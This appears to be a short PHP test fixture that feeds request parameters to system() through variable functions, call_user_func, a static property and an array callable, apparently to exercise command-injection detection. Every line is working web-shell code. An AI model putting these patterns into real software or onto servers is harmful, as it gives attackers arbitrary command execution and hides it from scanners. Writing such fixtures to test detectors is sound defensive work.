<?php
$fn = 'system';
$fn($_GET['cmd']);
call_user_func('system', $_POST['c']);
class Registry { public static $data; }
Registry::$data = $_GET['x'];
system(Registry::$data);
$arr = ['run' => 'system'];
$arr['run']($_GET['y']);
